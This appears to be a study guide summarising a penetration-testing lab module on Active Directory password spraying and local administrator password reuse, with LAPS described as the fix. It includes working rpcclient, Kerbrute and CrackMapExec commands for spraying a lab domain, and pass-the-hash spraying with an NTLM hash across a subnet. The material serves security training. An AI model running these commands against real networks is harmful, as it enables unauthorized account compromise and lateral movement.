## 1. Module Objective

In the previous section, we built a list of **valid domain usernames**.

Now the next stage is:

```text
Valid Usernames
       ↓
Choose a password
       ↓
Password Spraying
       ↓
Identify valid credentials
       ↓
Validate discovered credentials
       ↓
Continue enumeration / access
```

The module describes password spraying as one of the two main avenues for obtaining domain credentials, while emphasizing that it must be performed **cautiously** because authentication attempts can cause account lockouts.

---

# 🔐 2. What Is Password Spraying?

**Password spraying** means attempting **one password against many usernames**, rather than trying many passwords against one account.

### Traditional brute force

```text
User: administrator

password1
password2
password3
password4
...
```

### Password spraying

```text
Password: Welcome1

administrator → Welcome1
tjohnson      → Welcome1
sgage         → Welcome1
avazquez      → Welcome1
...
```

The key idea is:

> **Many users → one password**

This helps avoid repeatedly failing authentication against a single account.

---

# ⚠️ 3. Why Password Spraying Must Be Done Carefully

The previous module established the importance of knowing the domain's:

- Lockout threshold
    
- Lockout duration
    
- Bad-password behavior
    
- Existing failed-login counts
    

Before spraying, you should know the authentication policy.

For example:

```text
Lockout threshold = 5
```

does **not** mean:

> "Try five passwords against every account."

Instead, you must account for existing failed attempts and the environment's lockout behavior.

---

# 🖥️ 4. Internal Password Spraying From Linux

The module presents three primary Linux approaches:

1. **rpcclient**
    
2. **Kerbrute**
    
3. **CrackMapExec**
    

The overall methodology is:

```text
                 valid_users.txt
                       |
          +------------+------------+
          |            |            |
      rpcclient     Kerbrute    CrackMapExec
          |            |            |
          +------------+------------+
                       |
                Successful login
                       |
                       v
              Validate credentials
```

---

# 5. Method 1 — rpcclient

`rpcclient` can be used to test credentials against the Domain Controller.

One important point from the module is that a successful login is **not immediately obvious** from the `rpcclient` output.

Instead, the response contains:

```text
Authority Name
```

when authentication succeeds.

Therefore, we can use:

```bash
grep Authority
```

to filter the output.

---

# 6. Bash One-Liner

The module provides:

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Let's break it down.

### Read the usernames

```bash
cat valid_users.txt
```

Suppose:

```text
tjohnson
sgage
avazquez
...
```

---

### Loop through each user

```bash
for u in $(cat valid_users.txt)
```

The variable:

```text
$u
```

contains one username at a time.

---

### Supply username + password

```bash
-U "$u%Welcome1"
```

The format is:

```text
username%password
```

So if:

```text
u=tjohnson
```

the authentication becomes:

```text
tjohnson%Welcome1
```

---

### Execute an RPC command

```bash
-c "getusername;quit"
```

This tells `rpcclient` to:

1. Run `getusername`
    
2. Quit
    

---

### Filter successful responses

```bash
| grep Authority
```

Only responses containing:

```text
Authority
```

are displayed.

---

# 7. Example rpcclient Result

The module gives:

```text
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

The important interpretation is:

```text
Account Name → Successfully authenticated account
Authority Name → Domain authority
```

Therefore, `Authority Name` is the useful indicator in this particular `rpcclient` workflow.

---

# 🧠 8. Why `grep Authority`?

Without filtering, the command can produce a lot of output.

Instead of manually reading everything:

```text
output
output
output
successful login
output
output
```

we use:

```bash
grep Authority
```

to narrow the result.

General pentesting principle:

```text
Large output
     ↓
Identify success indicator
     ↓
Filter with grep
     ↓
Focus on useful results
```

---

# 9. Method 2 — Kerbrute

The module also demonstrates using **Kerbrute** for password spraying.

Command:

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

### Breakdown

|Component|Meaning|
|---|---|
|`kerbrute`|Kerberos enumeration/authentication tool|
|`passwordspray`|Password-spraying mode|
|`-d`|Domain|
|`inlanefreight.local`|Target domain|
|`--dc`|Domain Controller|
|`172.16.5.5`|Domain Controller IP|
|`valid_users.txt`|Username list|
|`Welcome1`|Password being tested|

---

# 10. Kerbrute Successful Login

The module's example shows:

```text
[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
```

Then:

```text
Done! Tested 57 logins (1 successes)
```

The important information is:

```text
VALID LOGIN
```

This indicates that Kerbrute identified a successful authentication.

---

# ⚠️ 11. Kerbrute Enumeration vs Password Spraying

This distinction is **extremely important** from the previous module.

### Username enumeration

```bash
kerbrute userenum ...
```

Purpose:

> Determine whether usernames exist.

### Password spraying

```bash
kerbrute passwordspray ...
```

Purpose:

> Test a password against known usernames.

They are different operations.

```text
userenum
   ↓
Find valid usernames

passwordspray
   ↓
Test credentials
```

---

# 12. Method 3 — CrackMapExec

The module describes **CrackMapExec** as another option for password spraying.

Command:

```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

![Image](https://images.openai.com/static-rsc-4/D5-yGkKyhws1lJ7Ifd8OmQQkgMv7VwAFpF_9hxsh0hFSJYUtszFkOYg2XeAIoOf0aELHHsPk7J9VEv7ozwkMicnRAqJPORQ6yNu2Ot9_wo-hLSzobQZ97iI7DdRFKme599JqKnxo4FGM3THOh2hGHojcPsQ5t0QfYehkU_5WjFEiDe-2k6XeOQHfj1lAL5Vy?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/tGM0qRkBbrB8D8QdgTmJGtLm8xZW2lY-9_YQnvsF5_iMsVsumhWRzN5yQYvEbah9BMphg3RDIinRoAvHHnvd12Fjufx-0lWitXVDA-zwsIm75-a-LYjcEch70H0KtirbN_S7DfA4HYTH0dtpCjNAaXcsmTPzGbOJhptNmjMRTiYD4YQrKWrHNFkV5pjDvS1L?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/rl7krcXNxHZlkVUpz-wbc3uSgfAmlNQzFBHfOe1fUqG7LwjyScMAulPEW3uce6wRRk_beWwhNy0GRXKPcoTJlyNJIJkWU946o5MUYQYKJW0fbAb8zrYl_tcx3TJjjEMQ6mZlBHXJHvXCPw5pqv5N7b5fZwRra9valKdhLbpRNbIU1RXJdFdHIlXkll0kJQ3e?purpose=fullsize)

Here:

```text
-u valid_users.txt
```

means the username list is supplied as a file.

And:

```text
-p Password123
```

specifies the single password being tested.

---

# 13. Filtering CrackMapExec Output

The module uses:

```bash
grep +
```

to focus on successful authentication results.

Example:

```text
SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

The key indicator is:

```text
[+]
```

In this workflow, that indicates a successful authentication.

---

# 14. Comparing the Three Linux Methods

|Tool|Main Success Indicator|
|---|---|
|`rpcclient`|`Authority Name`|
|`Kerbrute`|`VALID LOGIN`|
|`CrackMapExec`|`[+]`|

### 🧠 Memorize this

```text
rpcclient     → Authority
Kerbrute      → VALID LOGIN
CrackMapExec  → [+]
```

This is particularly useful when working with large command outputs.

---

# 15. Validating Discovered Credentials

Finding a possible credential is not necessarily the end.

The module demonstrates using CrackMapExec to validate credentials against the Domain Controller.

Command:

```bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

The successful result:

```text
[+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

confirms that the credentials are valid.

---

# 16. Why Validate Credentials?

Think of the process as:

```text
Password Spray
      ↓
Potential credential hit
      ↓
Validation
      ↓
Confirmed credential
      ↓
Further enumeration
```

Validation gives you greater confidence before using the credentials for subsequent authorized testing.

---

# 🔥 17. Local Administrator Password Reuse

The second major section introduces a different concept:

> **Local Administrator Password Reuse**

Password spraying isn't limited to domain accounts.

If you obtain:

- Local administrator credentials
    
- A local administrator NTLM hash
    
- Another privileged local account's password/hash
    

you may discover that the **same credential has been reused across multiple machines**.

---

# 18. Why Does Local Admin Password Reuse Happen?

The module identifies several reasons:

### Gold images

Organizations may deploy many machines from the same image.

```text
Golden Image
     ↓
100 computers
     ↓
Same local administrator password
```

### Ease of management

Administrators may intentionally use the same password across systems because it is easier to manage.

This creates a significant security weakness.

---

# 19. Example of Password Reuse

Suppose you discover:

```text
Desktop local admin:
$desktop%@admin123
```

You might observe a naming pattern suggesting:

```text
Server:
$server%@admin123
```

The important concept is **password-pattern reuse**, not simply trying random passwords.

Similarly, if you discover credentials for:

```text
ajones
```

you may encounter a related administrative account such as:

```text
ajones_adm
```

with a reused or related password.

---

# 20. Cross-Domain Password Reuse

The module also discusses domain trusts.

Suppose:

```text
Domain A
ajones : password
```

You may find that a similarly named account exists in:

```text
Domain B
ajones : same password
```

This represents another possible form of credential reuse.

Conceptually:

```text
Domain A
   |
   | Trust
   |
Domain B

Similar accounts
       ↓
Potential credential reuse
```

---

# 21. NTLM Hash Password Reuse

Sometimes you don't obtain the cleartext password.

Instead, you retrieve an **NTLM hash** from the local SAM database.

For example:

```text
administrator : NTLM_HASH
```

The module explains that this hash can be tested against multiple machines to determine whether the same local administrator credential has been reused.

---

# 22. Local Administrator Spraying With CrackMapExec

The module provides:

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

This is a very important command to understand.

### Target

```text
172.16.5.0/23
```

→ A subnet containing multiple hosts.

### Username

```text
-u administrator
```

→ Local administrator account.

### Hash

```text
-H 88ad09182de639ccc6579eb0849751cf
```

→ NTLM hash.

### Local authentication

```text
--local-auth
```

→ Tell CrackMapExec to authenticate against each machine's **local account database**, rather than treating the credentials as domain credentials.

---

# 🚨 23. Why `--local-auth` Is Critical

The module explicitly emphasizes this flag.

Without:

```text
--local-auth
```

the tool can attempt authentication through the current domain context.

That can potentially lead to **domain account lockouts**.

With:

```text
--local-auth
```

the authentication is performed against each host locally.

The module states that this also causes the tool to attempt the login only once per machine, removing the risk of repeatedly testing the same local account on that machine.

### 🔥 Memorize

```text
Local administrator spraying
             ↓
       --local-auth
```

And remember the module's warning:

> Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain.

---

# 24. Understanding `(Pwn3d!)`

The example output contains:

```text
[Pwn3d!]
```

Example:

```text
ACADEMY-EA-MX01\administrator
88ad09182de639ccc6579eb0849751cf
(Pwn3d!)
```

Within the module's context, this indicates that the credentials provide administrative access to the target host.

It is therefore a very important result when reviewing CrackMapExec output.

---

# 25. Example Result

The module demonstrates successful authentication to:

```text
172.16.5.50 → ACADEMY-EA-MX01
172.16.5.25 → ACADEMY-EA-MS01
172.16.5.125 → ACADEMY-EA-WEB0
```

The output indicates that the same local administrator credential was valid on multiple systems.

The module states that **3 systems** were identified in this example.

---

# 26. Why This Is Dangerous

Imagine:

```text
1 compromised workstation
        ↓
Local Administrator password obtained
        ↓
Same password reused everywhere
        ↓
Multiple servers accessible
```

This can turn a compromise of one endpoint into access to multiple systems.

---

# 27. High-Value Targets

The module specifically recommends considering high-value hosts such as:

- **SQL servers**
    
- **Microsoft Exchange servers**
    

These systems may contain:

- Highly privileged users
    
- Persistent credentials
    
- Sensitive information
    
- Additional pathways for privilege escalation
    

The key principle is:

> Don't only look at ordinary workstations; understand where privileged credentials are likely to exist.

---

# 28. Why This Technique Is Noisy

The module explicitly describes local administrator password spraying as:

> **Quite noisy**

Why?

Because you're potentially attempting authentication across:

```text
Many hosts
    ↓
SMB authentication
    ↓
Security logs
    ↓
Network traffic
    ↓
Potential alerts
```

Therefore, it may not be appropriate for assessments requiring stealth.

---

# 29. Defensive Remediation — LAPS

The module identifies **Local Administrator Password Solution (LAPS)** as one remediation approach.

LAPS allows Active Directory to:

- Manage local administrator passwords
    
- Enforce unique passwords per host
    
- Rotate passwords periodically
    

Conceptually:

### Without LAPS

```text
PC01 → Admin123
PC02 → Admin123
PC03 → Admin123
PC04 → Admin123
```

One compromise can potentially expose multiple machines.

### With unique rotating passwords

```text
PC01 → Password A
PC02 → Password B
PC03 → Password C
PC04 → Password D
```

and the passwords are rotated according to the configured policy.

![Image](https://images.openai.com/static-rsc-4/76-hPqi8bOHlNWANY0JJ1JrYWB2gFDkp4nl13i1qMWzcI1yhC1mKvByjcf8gtxHKx5rVyoraivHC3icJgCPWNwQX_HD69wNX-8L0estxSPg-_u7lYJjzSeDeTAaquX6Ie9Od2XenKGsblxvzPnEoo1XKfkSWhG4AerxKwLrqZhvl8rZixC-sFDY8m1AU5j7_?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/d42f_vt5UlKe-BImX-0Pv8Xcdg0BVXHAmtZ_oEh8ILPqnyM-4ef6aht3dqYNhb6_IVVCgQM5e_F1l84NkUkqrHvw5fdzVHvx0uDdmbKch4KZIkYT-5TBzyizVP3e5ke200ywIxeEOnxPT7Q_6wAiFjCpuRDgc38YmdcB6PCRd6WBxOb3KTN77YJD8WdD7oQE?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/jN1FjiomVaBa7qqh1CFi0V12jT34Q5zswPgYsDDtIz99Q7_vmTO1J6DseWSALA9VW4pEdQMq8LYzYUkGoN0gkEUMyy7PVDf4fBnAfO1nsIshr77U7dN3nuhnQiMwcgjn3MMfhlrAy64pimusAe-yJ8z9wQko95YZFrEqd7TO8DWtOVgYwrEXimdYfi-V2N8e?purpose=fullsize)

The module specifically references Microsoft's **Local Administrator Password Solution (LAPS)** as a remediation option.

---

# 🧠 30. Complete Methodology

Put the entire section together:

```text
             Valid User List
                    |
                    v
             Password Policy
                    |
                    v
          Choose assessment method
                    |
       +------------+------------+
       |            |            |
       v            v            v
   rpcclient     Kerbrute    CrackMapExec
       |            |            |
       +------------+------------+
                    |
                    v
            Identify valid login
                    |
                    v
          Validate credentials
                    |
                    v
         Further authorized access
```

For local administrator reuse:

```text
Obtain local admin password/hash
              |
              v
       Identify target hosts
              |
              v
        --local-auth
              |
              v
     Test local administrator
              |
              v
      Identify password reuse
              |
              v
      Enumerate compromised hosts
```

---

# 🔑 31. Must-Know Commands

### rpcclient spraying

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### Kerbrute spraying

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

### CrackMapExec spraying

```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### Validate credentials

```bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

### Local administrator hash reuse

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <NTLM_HASH> | grep +
```

---

# 🎯 32. Output Indicators to Memorize

|Tool|Successful result|
|---|---|
|`rpcclient`|`Authority Name`|
|`Kerbrute`|`VALID LOGIN`|
|`CrackMapExec`|`[+]`|
|CrackMapExec local admin|`(Pwn3d!)`|

---

# 🧩 33. Important Concepts to Memorize

### Password spraying

```text
ONE password → MANY users
```

### Brute force

```text
MANY passwords → ONE user
```

### `badpwdcount`

Tracks bad-password attempts associated with an account.

### `baddpwdtime`

Shows the time/date associated with the bad-password attempt information.

### `--local-auth`

Use when testing **local accounts** across multiple machines.

### NTLM hash

Can be used for authentication testing without needing the cleartext password when the protocol/tool supports it.

### Password reuse

Same credential may be reused across:

- Multiple workstations
    
- Servers
    
- Local administrator accounts
    
- Similarly named administrative accounts
    
- Potentially related/trusted domains
    

### LAPS

Helps mitigate local administrator password reuse through **unique, managed, rotating local administrator passwords**.

---

# 🔥 34. Mentor-Level Understanding

The most important lesson from this section isn't memorizing three commands.

It's understanding the difference between these two attack paths:

### Domain password spraying

```text
Valid domain users
       +
One password
       ↓
Domain Controller
       ↓
Potential domain credential
```

### Local administrator password reuse

```text
Local admin password/hash
       +
Multiple machines
       ↓
Local authentication
       ↓
Potential access to multiple hosts
```

The second attack can be particularly valuable after obtaining administrative access to **one** machine because password reuse can turn a single local compromise into access to additional systems.

---

## 🧠 Final Revision Sheet

```text
Password Spraying:
ONE password → MANY users

rpcclient:
grep Authority

Kerbrute:
VALID LOGIN

CrackMapExec:
grep +

Credential validation:
CrackMapExec against DC

Local Admin Reuse:
--local-auth

Hash authentication:
-H <NTLM_HASH>

Administrative access indicator:
(Pwn3d!)

Common remediation:
LAPS
```

### ⚠️ The one thing I want you to remember

**Always distinguish domain authentication from local authentication.**

```text
Domain account
     ↓
Domain Controller
     ↓
Normal domain authentication

Local administrator
     ↓
Individual machine
     ↓
--local-auth
```

And because this module involves actual authentication attempts, **lockout policy and authorization are part of the technique—not an afterthought.**